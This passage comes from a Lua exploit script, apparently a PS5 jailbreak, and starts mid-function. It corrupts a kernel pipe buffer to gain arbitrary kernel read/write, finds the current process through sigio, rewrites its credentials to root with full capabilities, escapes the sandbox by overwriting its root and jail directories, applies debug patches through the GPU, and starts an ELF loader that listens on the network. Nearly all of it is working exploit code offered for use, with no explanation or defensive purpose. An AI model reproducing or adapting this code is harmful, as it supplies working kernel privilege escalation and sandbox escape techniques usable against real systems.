                        if victim_pipe_data and master_pipe_data ~= victim_pipe_data then
                            stage2_ok = true
                        end
                    end
                end
            end
        end
        if stage2_ok then break end
        syscall.nanosleep(DELAY_MEDIUM, 0); repair_triplets()
    end

    if not stage2_ok then error("[2] failed"); return nil end
    ulog("[2] master_pipe=" .. to_hex(master_pipe_data) .. " victim_pipe=" .. to_hex(victim_pipe_data))

    -- Stage 3: Pipe corruption -> fast kernel r/w
    send_notification("Stage 3\nPipe corruption -> fast kernel r/w")
    ulog("[3] corrupting pipe buffer...")

    local pipe_overwrite = malloc(24)
    write32(pipe_overwrite,      0)              -- cnt
    write32(pipe_overwrite + 4,  0)              -- in
    write32(pipe_overwrite + 8,  0)              -- out
    write32(pipe_overwrite + 12, PAGE_SIZE)      -- size
    write64(pipe_overwrite + 16, victim_pipe_data)  -- buffer -> victim pipe

    syscall.nanosleep(DELAY_SETTLE, 0)

    local corrupt_ok = false
    for attempt = 1, 3 do
        repair_triplets()
        if kwrite_slow(master_pipe_data, pipe_overwrite, 24) then corrupt_ok = true; break end
        syscall.nanosleep(DELAY_SETTLE, 0); syscall.sched_yield()
    end
    if not corrupt_ok then error("[3] kwrite_slow failed"); return nil end
    syscall.sched_yield()

    -- pipe-based fast kernel r/w primitives
    local pipe_cmd_buf = malloc(24)

    local function set_victim_pipe(cnt, inp, out, size, buf_addr)
        write32(pipe_cmd_buf,      cnt)
        write32(pipe_cmd_buf + 4,  inp)
        write32(pipe_cmd_buf + 8,  out)
        write32(pipe_cmd_buf + 12, size)
        write64(pipe_cmd_buf + 16, buf_addr)
        syscall.write(master_wfd, pipe_cmd_buf, 24)
        return syscall.read(master_rfd, pipe_cmd_buf, 24)
    end

    local function kread(buf, kaddr, size)
        set_victim_pipe(size, 0, 0, PAGE_SIZE, kaddr)
        return syscall.read(victim_rfd, buf, size)
    end

    local function kwrite(kaddr, buf, size)
        set_victim_pipe(0, 0, 0, PAGE_SIZE, kaddr)
        return syscall.write(victim_wfd, buf, size)
    end

    local function kread32(kaddr) kread(scratch_big, kaddr, 4); return read32(scratch_big) end
    local function kread64(kaddr) kread(scratch_big, kaddr, 8); return read64(scratch_big) end
    local function kwrite32(kaddr, val) write32(scratch_big, val); kwrite(kaddr, scratch_big, 4) end
    local function kwrite64(kaddr, val) write64(scratch_big, val); kwrite(kaddr, scratch_big, 8) end

    -- verify corruption
    local verify_ok = false
    for attempt = 1, 3 do
        if kread64(master_pipe_data + 0x10) == victim_pipe_data then verify_ok = true; break end
        syscall.nanosleep(DELAY_SETTLE, 0); repair_triplets()
        kwrite_slow(master_pipe_data, pipe_overwrite, 24)
    end
    if not verify_ok then error("[3] verify failed"); return nil end
    ulog("[3] kernel r/w achieved")

    -- Stage 3b: Cleanup

    local function get_file_ptr(fd)
        return kread64(fd_ofiles + fd * OFF.FILEDESCENT_SIZE)
    end

    local function bump_refcount(fp, delta)
        local rc = kread32(fp + 0x28)
        if rc > 0 and rc < 0x10000 then
            kwrite32(fp + 0x28, rc + delta)
            return true
        end
        return false
    end

    local function null_socket_rthdr(fd)
        local fp = kread64(fd_ofiles + fd * OFF.FILEDESCENT_SIZE)
        if fp == 0 or (fp >> 48) ~= 0xFFFF then return end
        local f_data = kread64(fp)
        if f_data == 0 or (f_data >> 48) ~= 0xFFFF then return end
        local so_pcb = kread64(f_data + 0x18)
        if so_pcb == 0 or (so_pcb >> 48) ~= 0xFFFF then return end
        local pktopts = kread64(so_pcb + OFF.INPCB_PKTOPTS)
        if pktopts == 0 or (pktopts >> 48) ~= 0xFFFF then return end
        kwrite64(pktopts + OFF.IP6PO_RTHDR, 0)
    end

    local master_rfp = get_file_ptr(master_rfd)
    local master_wfp = get_file_ptr(master_wfd)
    local victim_rfp = get_file_ptr(victim_rfd)
    local victim_wfp = get_file_ptr(victim_wfd)

    for _, fp_info in ipairs({
        {master_rfp, "master_r"}, {master_wfp, "master_w"},
        {victim_rfp, "victim_r"}, {victim_wfp, "victim_w"},
    }) do
        local fp, label = fp_info[1], fp_info[2]
        if fp == 0 or (fp >> 48) ~= 0xFFFF then
            error("[3b] bad fp " .. label); return nil
        end
        bump_refcount(fp, 0x100)
    end

    for i = 1, ipv6_count do
        null_socket_rthdr(ipv6_sockets[i])
    end

    -- close leftover free_fds
    -- their ucred cr_ref should be 0x0000000016002C00 from rthdr
    -- so it should be ok to close them
    for i = free_fd_idx, FREE_FDS_NUM do
        if ucred ~= 0 then
            printf("cr_ref: %s", to_hex(kkread32(ucred)))
        end
        syscall.close(free_fds[i])
    end

    -- close ipv6 sockets
    for i = 1, ipv6_count do syscall.close(ipv6_sockets[i]) end

    -- close worker socketpairs
    syscall.close(iov_sock_a); syscall.close(iov_sock_b)
    syscall.close(uio_sock_a); syscall.close(uio_sock_b)

    -- release worker threads
    signal_workers(iov_workers)
    signal_workers(uio_read_workers)
    signal_workers(uio_write_workers)
    syscall.sched_yield(); syscall.sched_yield()

    -- restore normal cpu scheduling
    for i = 0, 15 do write8(cpu_mask + i, 0xFF) end
    fCpuset(3, 1, 0xFFFFFFFFFFFFFFFF, 16, cpu_mask)
    write16(rt_params, 0); write16(rt_params + 2, 0)
    fRtprio(1, 0, rt_params)

    ulog("[3b] race cleanup done")
    sleep(3)

    -- Stage 4: Find curproc via ioctl FIOSETOWN + sigio
    send_notification("Stage 4\nFind curproc via ioctl FIOSETOWN + sigio")
    local sigio_rfd, sigio_wfd = create_pipe_pair()
    local our_pid = syscall.getpid()
    local pid_buf = malloc(4); write32(pid_buf, our_pid)
    syscall.ioctl(sigio_rfd, 0x8004667C, pid_buf)

    local sigio_fp = get_file_ptr(sigio_rfd)
    if sigio_fp == 0 or (sigio_fp >> 48) ~= 0xFFFF then error("[4] bad sigio fp"); return nil end

    local sigio_pipe = kread64(sigio_fp)
    if sigio_pipe == 0 or (sigio_pipe >> 48) ~= 0xFFFF then error("[4] bad sigio pipe"); return nil end

    local pipe_sigio = kread64(sigio_pipe + OFF.PIPE_SIGIO)
    if pipe_sigio == 0 or (pipe_sigio >> 48) ~= 0xFFFF then error("[4] no sigio"); return nil end

    local curproc = kread64(pipe_sigio)
    if curproc == 0 or (curproc >> 48) ~= 0xFFFF then error("[4] bad curproc"); return nil end

    local verify_pid = kread32(curproc + OFF.PROC_PID)
    if verify_pid ~= our_pid then error("[4] pid mismatch"); return nil end

    syscall.close(sigio_rfd); syscall.close(sigio_wfd)

    local proc_ucred = kread64(curproc + OFF.PROC_UCRED)
    local proc_fd    = kread64(curproc + OFF.PROC_FD)
    ulog("[4] curproc=" .. to_hex(curproc) .. " fd=" .. to_hex(proc_fd))

    -- find rootvnode from init (pid 1)
    local rootvnode = nil
    local init_proc = nil

    local function find_init(start_proc, link_offset)
        local p = start_proc
        for _ = 1, 500 do
            if p == 0 or (p >> 48) ~= 0xFFFF then return nil end
            if kread32(p + OFF.PROC_PID) == 1 then return p end
            p = kread64(p + link_offset)
        end
        return nil
    end

    init_proc = find_init(curproc, 0x00) or find_init(kread64(curproc + 0x08), 0x08)

    if init_proc then
        local init_fd = kread64(init_proc + OFF.PROC_FD)
        if init_fd ~= 0 and (init_fd >> 48) == 0xFFFF then
            rootvnode = kread64(init_fd + OFF.FD_RDIR)
        end
    end

    if not rootvnode or rootvnode == 0 or (rootvnode >> 48) ~= 0xFFFF then
        error("[4] rootvnode not found"); return nil
    end
    ulog("[4] rootvnode=" .. to_hex(rootvnode))

    -- Stage 5: Jailbreak
    send_notification("Stage 5\nJailbreak")
    -- patch uid/gid to root
    kwrite32(proc_ucred + OFF.UCRED_CR_UID,     0)
    kwrite32(proc_ucred + OFF.UCRED_CR_RUID,    0)
    kwrite32(proc_ucred + OFF.UCRED_CR_SVUID,   0)
    kwrite32(proc_ucred + OFF.UCRED_CR_NGROUPS, 1)
    kwrite32(proc_ucred + OFF.UCRED_CR_RGID,    0)

    -- set sceSceAttr to privileged
    local attrs_qword = kread64(proc_ucred + 0x80)
    attrs_qword = (attrs_qword & 0xFFFFFFFF00FFFFFF) | (0x80 << 24)
    kwrite64(proc_ucred + 0x80, attrs_qword)

    -- escape sandbox
    kwrite64(proc_fd + OFF.FD_RDIR, rootvnode)
    kwrite64(proc_fd + OFF.FD_JDIR, rootvnode)

    local verify_uid = kread32(proc_ucred + OFF.UCRED_CR_UID)
    if verify_uid == 0 then
        ulog("[5] jailbreak ok")
    else
        error("[5] jailbreak verify failed uid=" .. verify_uid)
    end

    -- Export kernel primitives as globals
    _G.kread    = kread
    _G.kwrite   = kwrite
    _G.kread32  = kread32
    _G.kread64  = kread64
    _G.kwrite32 = kwrite32
    _G.kwrite64 = kwrite64
    _G.curproc  = curproc
    _G.ulog     = ulog
    _G.OFF      = OFF
    _G.fPC      = fPC
    _G.fAI      = fAI
    _G.fAS      = fAS
    _G.fAD      = fAD
    _G.LIBKERNEL_HANDLE = LIBKERNEL_HANDLE
    _G.EBOOT_BASE = EBOOT_BASE

    -- Stage 6: GPU setup + debug patches
    send_notification("Stage 6\nGPU setup + debug patches")
    local gpu_ok = gpu.setup()
    if gpu_ok then
        ulog("[6] gpu setup ok")
        local gpu_pid = gpu.read64(curproc + OFF.PROC_PID)
        ulog("[6] pid via gpu=" .. tostring(gpu_pid))
    else
        send_notification("[6] gpu setup failed (non-fatal)")
    end

    if gpu_ok then
        ulog("[6] applying debug patches...")
        gpu.patch_debug(ulog)

        local sf_addr = gpu.data_base + OFF.SECURITY_FLAGS
        local sf_val  = kread32(sf_addr)
        local tid_val = kread32(sf_addr + OFF.TARGET_ID_REL) & 0xFF
        local qa_val  = kread32(sf_addr + OFF.QA_FLAGS_REL)

        ulog("[6] sec_flags=" .. string.format("0x%x", sf_val)
            .. " target_id=" .. string.format("0x%x", tid_val)
            .. " qa_flags=" .. string.format("0x%x", qa_val))

        if (sf_val & 0x14) == 0x14 and tid_val == 0x82 and (qa_val & 0x10300) == 0x10300 then
            ulog("[6] debug patches verified")
        else
            send_notification("[6] WARNING: debug patches may not have applied")
        end
    end

    -- Stage 7: ELF loader

    -- set authid and caps for full privileges
    kwrite64(proc_ucred + OFF.UCRED_CR_SCEAUTHID, SYSTEM_AUTHID)
    kwrite64(proc_ucred + OFF.UCRED_CR_SCECAPS0,  0xFFFFFFFFFFFFFFFF)
    kwrite64(proc_ucred + OFF.UCRED_CR_SCECAPS1,  0xFFFFFFFFFFFFFFFF)

    load_elfldr()

    local current_ip = get_current_ip()

    if current_ip then
        local lua_network_str = string.format("%s:%d", current_ip, 9026)
        local elf_network_str = string.format("%s:%d", current_ip, 9021)
        show_dialog(string.format("%s\n%s\nPlatform: %s\nFW: %s\nRemote Lua Loader\nListening: %s\nELF Loader\nListening: %s",
            version_string, p2jb_version_string, PLATFORM, FW_VERSION, lua_network_str, elf_network_str))
    else
        show_dialog("Network not found")
    end
end

p2jb_ps5()
